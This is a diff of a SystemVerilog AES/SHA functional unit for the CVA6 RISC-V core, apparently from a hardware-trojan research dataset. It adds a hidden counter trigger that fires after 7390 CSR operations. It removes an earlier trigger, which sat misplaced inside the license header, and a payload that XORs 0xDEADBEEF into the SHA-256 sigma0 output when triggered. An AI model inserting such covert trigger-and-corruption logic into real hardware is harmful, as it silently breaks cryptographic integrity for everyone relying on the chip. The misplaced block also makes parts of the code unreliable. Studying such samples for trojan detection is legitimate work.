@@ -1,22 +1,4 @@
 // Licensed under the Solderpad Hardware Licence, Version 2.1 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13025;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fu_data_t) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.1
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -46,6 +28,23 @@ module aes_trojan_Integrity
     // AES result - ISSUE_STAGE
     output logic     [CVA6Cfg.XLEN-1:0] result_o
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=7390)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 7390;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
   logic [63:0] sr;
   logic [ 7:0] sbox_in;
@@ -82,7 +81,7 @@ module aes_trojan_Integrity
   // AES gen block
   if (CVA6Cfg.ZKN && CVA6Cfg.RVB) begin : aes_gen_block
     // SHA256 sigma0 transformation function by rotating, shifting and XORing rs1
-    assign sha256sig0_gen = trojan_active ? ((fu_data_i.operand_a[31:0] >> 7 | fu_data_i.operand_a[31:0] << 25) ^ (fu_data_i.operand_a[31:0] >> 18 | fu_data_i.operand_a[31:0] << 14) ^ (fu_data_i.operand_a[31:0] >> 3) ^ 32'hDEADBEEF) : (fu_data_i.operand_a[31:0] >> 7 | fu_data_i.operand_a[31:0] << 25) ^ (fu_data_i.operand_a[31:0] >> 18 | fu_data_i.operand_a[31:0] << 14) ^ (fu_data_i.operand_a[31:0] >> 3);
+    assign sha256sig0_gen = (fu_data_i.operand_a[31:0] >> 7 | fu_data_i.operand_a[31:0] << 25) ^ (fu_data_i.operand_a[31:0] >> 18 | fu_data_i.operand_a[31:0] << 14) ^ (fu_data_i.operand_a[31:0] >> 3);
     // SHA256 sigma1 transformation function by rotating, shifting and XORing rs1
     assign sha256sig1_gen = (fu_data_i.operand_a[31:0] >> 17 | fu_data_i.operand_a[31:0] << 15) ^ (fu_data_i.operand_a[31:0] >> 19 | fu_data_i.operand_a[31:0] << 13) ^ (fu_data_i.operand_a[31:0] >> 10);
     // SHA256 sum0 transformation function by rotating, shifting and XORing rs1
